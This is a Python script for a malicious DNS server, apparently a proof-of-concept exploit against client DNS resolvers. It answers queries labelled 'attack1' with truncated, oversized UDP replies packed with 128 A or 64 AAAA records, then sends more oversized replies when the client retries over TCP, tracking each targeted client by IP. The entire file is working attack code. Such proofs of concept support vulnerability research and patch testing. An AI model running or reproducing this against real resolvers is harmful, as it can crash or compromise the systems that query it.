#!/usr/bin/env python3

import socket
import struct
import threading
import time
import sys

from dnsutil import DNSParser, DNSMessage, DNSHeader, DNSQuestion, DNSRR, DNSFlags

HOST=""
PORT=53


attack1_state = {}


def dw(v):
    return struct.pack("!H", v)

def dd(v):
    return struct.pack("!L", v)

def log(*args):
    print(*args)
    sys.stdout.flush()


def attack1_udp(request):

    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA", "TC"])

    question = request.questions[0]
    rtype = question.qtype
    answers = []

    # Type A reply
    if rtype == 1:
        ancount = 128 
        for i in range(ancount):
            answers.append(DNSRR(question.labels, rtype, 1, 0, 4, b"D"*4))

    # Type AAAA reply
    if rtype == 28:
        ancount = 64
        for i in range(ancount):
            answers.append(DNSRR(question.labels, rtype, 28, 0, 16, b"B"*16))

    header = DNSHeader(request.header.ID, flags, 1, ancount, 0, 0)
    message = DNSMessage(header, [question], answers, [], [])
    return message.bytes()


def attack1_tcp(request):

    flags = DNSFlags(request.header.flags.flags_int())
    flags.set(["QR", "AA"])

    question = request.questions[0]
    rtype = question.qtype
    answers = []

    # Type A reply
    if rtype == 1:
        ancount = 128
        for i in range(ancount):
            answers.append(DNSRR(question.labels, rtype, 1, 13, 4, b"D"*4))

    # Type AAAA reply
    if rtype == 28:
        ancount = 64
        for i in range(ancount):
            answers.append(DNSRR(question.labels, rtype, 28, 13, 16, b"B"*16))

    header = DNSHeader(request.header.ID, flags, 1, ancount, 0, 0)
    message = DNSMessage(header, [question], answers, [], [])
    return message.bytes()


def udp_server():
    """UDP request handler"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))

    while True:
        data, addr = sock.recvfrom(1024)
        log("[UDP] Datagram from {}:{}".format(*addr))

        # Parse DNS request
        tmp, request = DNSParser.parse_message(data)
        log("[UDP] {} bytes in: {}".format(len(data), request.header))

        # Execute selected attack
        if request.questions and request.questions[0].labels[0] == b"attack1":
            if addr[0] not in attack1_state:
                log("[attack1] Sending UDP reply #1 against {}:{}".format(*addr))
                data = attack1_udp(request)
                sock.sendto(data, addr)
                attack1_state[addr[0]] = threading.Event()
            else:
                got_tcp = attack1_state[addr[0]].wait(2.0)

                if not got_tcp:
                    log("[attack1] Timed out waiting for TCP from {}:{}".format(*addr))
                    attack1_state.pop(addr[0], None)
                else:
                    log("[attack1] Sending UDP reply #2 against {}:{}".format(*addr))
                    data = attack1_udp(request)
                    sock.sendto(data, addr)



def tcp_server():
    """TCP request handler"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((HOST, PORT))
    sock.listen(10)

    while True:
        conn, addr = sock.accept()
        log("[TCP] Connection from {}:{}".format(*addr))

        while True:
            # Read message length
            try:
                msglen = struct.unpack("!H", conn.recv(2))[0]
                data = conn.recv(msglen)
            except:
                log("[TCP] Disconnected from {}:{}".format(*addr))
                break

            # Parse DNS request header
            tmp, request = DNSParser.parse_message(data)
            log("[TCP] {} bytes in: {}".format(len(data), request.header))

            # Execute selected attack
            if request.questions and request.questions[0].labels[0] == b"attack1":
                if addr[0] in attack1_state:
                    attack1_state[addr[0]].set()
                    log("[attack1] Sending TCP reply #1 against {}:{}".format(*addr))
                    data = attack1_tcp(request)
                    conn.sendall(dw(len(data)) + data)
                    attack1_state.pop(addr[0], None)
                else:
                    log("[attack1] Sending TCP reply #2 against {}:{}".format(*addr))
                    data = attack1_tcp(request)
                    conn.sendall(dw(len(data)) + data)

if __name__ == "__main__":

    if len(sys.argv) > 1:
        HOST = sys.argv[1]

    if len(sys.argv) > 2:
        PORT = sys.argv[2]
        
    udp_thread = None
    tcp_thread = None

    while True:
        if not udp_thread or not udp_thread.is_alive():
            log("Starting UDP server...")
            udp_thread = threading.Thread(target=udp_server)
            udp_thread.daemon = True
            udp_thread.start()

        if not tcp_thread or not tcp_thread.is_alive():
            log("Starting TCP server...")
            tcp_thread = threading.Thread(target=tcp_server)
            tcp_thread.daemon = True
            tcp_thread.start()

        time.sleep(5)

